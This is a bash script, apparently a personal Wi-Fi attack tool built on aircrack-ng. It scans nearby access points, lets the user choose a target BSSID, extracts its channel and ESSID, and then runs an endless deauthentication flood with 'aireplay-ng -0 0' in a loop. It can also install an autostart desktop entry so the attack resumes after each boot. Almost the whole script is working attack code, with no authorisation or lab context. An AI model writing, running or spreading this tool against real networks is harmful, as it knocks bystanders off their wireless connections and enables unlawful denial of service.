#!/bin/bash

GREEN='\033[0;32m'
BLUE='\033[0;34m'
GREY='\033[0;90m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

cp /root/d/d /root/d/h /usr/local/bin

count2(){
echo -e "${GREY}${NC}"
sleep 1
echo -e "${GREY}${NC}"
sleep 1 
}
banner() {
echo -e "${GREY}               █      █ █  █  █ P911n"
}

Monitor() {
banner

Monitorning_specific_essid() {
if [[ -z $b ]]; then
Monitor_interface="1"
elif [ -e "/sys/class/net/wlan$a" ]; then
Monitor_interface=$a
else
Monitor_interface=$b
fi
echo -e "${GREY}Monitor_i: ${GREEN}wlan$Monitor_interface${NC}"
echo "Monitorning especific ESSID... "
count2
#### SELECTING_EXTRACTING_SSID ####
while true; do
    airodump-ng -a -w output --output-format csv wlan$Monitor_interface &
    sleep 10
    pkill airodump-ng
    awk -F ',' -v num=1 '{print num++, $1, $14}' output-01.csv > output.txt
    sed -i '/Station/,$d' output.txt && sed -i '1d; 2d; $d' output.txt
    sudo rm *.csv
    echo -e "${RED}"
    cat output.txt
    echo -e "${NC}"
    while true; do
        echo -e "${YELLOW}r${GREY} to reMonitor"
        echo -e "${GREY}"
        read -p "Enter the number of BSSID: " selected_num 
        if [[ $selected_num == "r" ]]; then
            break 
        fi
        bssid=$(awk -v num="$selected_num" '$1 == num {print $2}' output.txt)
  
        if [[ -z $bssid ]]; then
            echo -e "${YELLOW}Try again${NC}"
            echo -e "${RED}"
            cat output.txt
            echo -e "${NC}"
        else
            break 2
        fi
    done
done

#### EXTRACTING ESSID ####
while true; do
airodump-ng -a -w output --output-format csv wlan$Monitor_interface --bssid $bssid & 
sleep 10
pkill airodump-ng
sudo rm cleaned_channel.txt && sudo rm channel.txt
echo "$(grep "$bssid" output-01.csv | cut -d ',' -f 14 )" > essid.txt
cat essid.txt | awk '{$1=$1};1' > cleaned_essid.txt
essid=$(head -n 1 cleaned_essid.txt)
if [[ -z $essid ]]; then
        echo -e "${RED}did not get ESSID reMonitorning 2s${NC}"
        count2
else
        echo ""
        echo -e "${GREY}ESSID is: ${GREEN}$essid${NC}"
        echo -e "${GREY}Proceeding in 2s${NC}"
        count2
        xterm -e "airodump-ng wlan$Monitor_interface -a --manufacture --essid $essid" &
        break
      fi
done
xterm -e "airodump-ng wlan$Monitor_interface -a --manufacture --essid $essid" &
}

while true; do
echo -e "${YELLOW}"
airmon-ng
echo -e "${GREY}"
echo -e ""${RED}y"${GREY} to Monitor specific ESSID (e.g. y, y 1)(default: no)"
read -p "Monitor interface number (default: 1): " interface_numbers
echo -e "${GREY}"
a=$(echo "$interface_numbers" | awk '{print $1}')
b=$(echo "$interface_numbers" | awk '{print $2}')
#### MONITORING ALL ####
if [ -z "$interface_numbers" ]; then
Monitor_interface="1"
echo -e "${GREEN}wlan$Monitor_interface"
echo -e "${GREEN}Monitorning for AP"
count2
xterm -e "airodump-ng wlan$Monitor_interface -a --manufacture"

elif [ -e "/sys/class/net/wlan$a" ] && [[ -z $b ]]; then
Monitor_interface=$a
echo -e "${GREY}Monitor_i: wlan$Monitor_interface"
echo "Monitorning all AP... "
count2
xterm -e "airodump-ng wlan$Monitor_interface -a --manufacture"

#### MONITORING SPECIFIC ESSID ####
elif [ $a == "y" ] && ([ -e "/sys/class/net/wlan$b" ] || [[ -z $b ]]) || ([ $b == "y" ] && [ -e "/sys/class/net/wlan$a" ]); then
if [[ -z $b ]]; then
Monitor_interface="1"
elif [ -e "/sys/class/net/wlan$a" ]; then
Monitor_interface=$a
else
Monitor_interface=$b
fi
echo -e "${GREEN}wlan$Monitor_interface${NC}"
echo -e "${GREEN}Monitorning especific ESSID "
count2
#### SELECTING_EXTRACTING_SSID ####
while true; do
    airodump-ng -a -w output --output-format csv wlan$Monitor_interface &
    sleep 10
    pkill airodump-ng
    awk -F ',' -v num=1 '{print num++, $1, $14}' output-01.csv > output.txt
    sed -i '/Station/,$d' output.txt && sed -i '1d; 2d; $d' output.txt
    sudo rm *.csv
    echo -e "${RED}"
    cat output.txt
    echo -e "${NC}"
    while true; do
        echo -e "${YELLOW}r${GREY} to reMonitor"
        echo -e "${GREY}"
        read -p "Enter the number of BSSID: " selected_num
        if [[ $selected_num == "r" ]]; then
            break 
        fi
        bssid=$(awk -v num="$selected_num" '$1 == num {print $2}' output.txt)
  
        if [[ -z $bssid ]]; then
            echo -e "${YELLOW}Try again${NC}"
            echo -e "${RED}"
            cat output.txt
            echo -e "${NC}"
        else
            break 2
        fi
    done
done

#### EXTRACTING ESSID ####
while true; do
airodump-ng -a -w output --output-format csv wlan$Monitor_interface --bssid $bssid & 
sleep 10
pkill airodump-ng
sudo rm cleaned_channel.txt && sudo rm channel.txt
echo "$(grep "$bssid" output-01.csv | cut -d ',' -f 14 )" > essid.txt
cat essid.txt | awk '{$1=$1};1' > cleaned_essid.txt
essid=$(head -n 1 cleaned_essid.txt)
if [[ -z $essid ]]; then
        echo -e "${RED}did not get ESSID reMonitorning 2s${NC}"
        count2
else
        echo ""
        echo -e "${GREY}ESSID is: ${GREEN}$essid${NC}"
        echo -e "${GREY}Proceeding in 2s...${NC}"
        count2
        
        break
      fi
done
xterm -e "airodump-ng wlan$Monitor_interface -a --manufacture --essid '$essid' " &
exit
else
echo -e "interface not found: ${RED}$a $b${YELLOW}"
echo ""
fi
done
}

Deauther() {
banner
if [[ ! -e "h" ]]; then
## selecting interface
while true; do
    echo -e "${YELLOW}"
    airmon-ng
    echo -e "${GREY}"
    read -p "Deauther & Monitor interface number (default: 1 2): " interface_numbers
    echo -e "${GREY}"
    if [ -z "$interface_numbers" ]; then
        Deauther_interface="1"
        Monitor_interface="2"
    else
        Deauther_interface=$(echo "$interface_numbers" | awk '{print $1}')
        Monitor_interface=$(echo "$interface_numbers" | awk '{print $2}')
    fi
    if [ -e "/sys/class/net/wlan$Deauther_interface" ] && [ -e "/sys/class/net/wlan$Monitor_interface" ] && [ ! $Deauther_interface == $Monitor_interface ]; then
       ## read -p "Deauther_i: wlan$Deauther_interface Monitor_i: wlan$Monitor_interface "
        break
    elif [ $Deauther_interface == $Monitor_interface ]; then 
        echo -e "${RED}YOU HAVE TO USE 2 INTERFACE${NC}"
    else
        echo -e "${RED}Interface not found $Monitor_interface $Deauther_interface${NC}"
    echo -e "${RED}do u have 2 interface? check it 1st below${YELLOW}"
echo -e "${RED}or you may be trying to use 1 interface ${YELLOW}"
echo -e "${RED}pleace type two interface (e.g. 0 1,1 2)${YELLOW}"
    fi
done
#### extracting bssid ####
while true; do
    airodump-ng -a -w output --output-format csv wlan$Deauther_interface &
    sleep 10
    pkill airodump-ng
    awk -F ',' -v num=1 '{print num++, $1, $14}' output-01.csv > output.txt
    sed -i '/Station/,$d' output.txt && sed -i '1d; 2d; $d' output.txt
    sudo rm *.csv
    echo -e "${RED}"
    cat output.txt
    echo -e "${NC}"
    while true; do
        echo -e "${YELLOW}r${GREY} to reMonitor"
        echo -e "${GREY}"
        read -p "Enter the number of BSSID: " selected_num
        if [[ $selected_num == "r" ]]; then
            break 
        fi
        bssid=$(awk -v num="$selected_num" '$1 == num {print $2}' output.txt)
  
        if [[ -z $bssid ]]; then
            echo -e "${YELLOW}Try again${NC}"
            echo -e "${RED}"
            cat output.txt
            echo -e "${NC}"
        else
            break 2
        fi
    done
done
         else
    read -r Deauther_interface Monitor_interface bssid _ < "h"
echo ""
echo -e "${GREY}Deauther_interface: ${GREEN}$Deauther_interface${NC}"
echo -e "${GREY}Monitor_interface: ${GREEN}$Monitor_interface${NC}"
echo -e "${GREY}BSSID: ${GREEN}$bssid${NC}"
echo ""
        count2
fi
echo "$Monitor_interface $Deauther_interface $bssid" > /root/.0/h
sudo rm output.txt 
#### extracting channel ####
while true; do
while true; do
while true; do
sudo rm *.csv
sudo rm cleaned_essid.txt && sudo rm essid.txt
sudo rm cleaned_channel.txt && sudo rm channel.txt
echo -e "${GREY}Extrating channel in 5s"
counting
airodump-ng -a -w output --output-format csv wlan$Deauther_interface --bssid $bssid & 
sleep 10
pkill airodump-ng
echo "$(grep "$bssid" output-01.csv | cut -d ',' -f 4 )" > channel.txt
cat channel.txt | awk '{$1=$1};1' > cleaned_channel.txt
channel=$(head -n 1 cleaned_channel.txt)
if [[ -z $channel ]]; then
        echo -e "${RED}did not get channel reMonitoring in 2s...${NC}"
        count2
else 
        break
      fi
done
#### extracting essid for Monitoring ####
sudo rm cleaned_channel.txt && sudo rm channel.txt
echo "$(grep "$bssid" output-01.csv | cut -d ',' -f 14 )" > essid.txt
cat essid.txt | awk '{$1=$1};1' > cleaned_essid.txt
essid=$(head -n 1 cleaned_essid.txt)
if [[ -z $essid ]]; then
        echo -e "${RED}did not get ESSID reMonitorning 2s${NC}"
        count2
else
        echo ""
        echo -e "${GREY}ESSID is: ${GREEN}$essid${NC}"
        echo -e "${GREY}channel is: ${GREEN}$channel${NC}"
        echo -e "${GREY}Proceeding in 2s...${NC}"
        count2
        break
      fi
done
sudo rm *.csv
sudo rm cleaned_essid.txt && sudo rm essid.txt
    xterm -e "airodump-ng wlan$Monitor_interface -a --manufacturer  --essid \"$essid\"" &
    echo -e "${GREY}"
    airmon-ng start wlan$Deauther_interface "$channel"
    aireplay-ng -0 0 -a $bssid wlan$Deauther_interface 
    done
}
#### AUTOSTART MODE ####
autostart_mode() {
desktop_file_content="[Desktop Entry] 
Type=Application 
Exec=xterm -e \"b \" &
Hidden=false
X-GNOME-Autostart-enabled=true
Name=Startup 
Script Comment="
echo "$desktop_file_content" > "/root/.config/autostart/b.desktop"
}
#### NORMAL MODE ####
normal_mode() {
desktop_file_content=""
echo "$desktop_file_content" > "/root/.config/autostart/b.desktop"
}

mode=$1
## (d a) autostart deauther afterboot 
if [ "$mode" == "a" ] && [[ -z "$2" ]]; then
autostart_mode
      echo -e "${GREEN}Deauther-Autostart${NC}"
      echo ""
      echo ""
      Deauther
## normal
## (d ) NO start afterboot 
elif [[ -z "$1" ]]; then
normal_mode
      echo -e "${GREEN}Deauther-Normal${NC}"
      echo ""
      echo ""
      Deauther
## (d m) monitor
elif [ "$1" == "m" ]; then 
normal_mode
            echo -e "${GREEN}Monitor${NC}"
            echo ""  
            echo ""
            Monitor
## rm all created files
elif [ "$1" == "c" ]; then
## $dir
## /root/.0
sudo rm h
sudo rm output.txt && sudo rm *.csv
sudo rm cleaned_essid.txt && sudo rm essid.txt
sudo rm output-01.csv && sudo rm cleaned_channel.txt && sudo rm channel.txt
## help
else
echo "(d a) Autostart deauther afterboot "
echo "(d ) NO Autostart afterboot" 
echo "(d m) Monitor"
echo "(d ?) Help"
echo "(d c) clean"
exit
fi
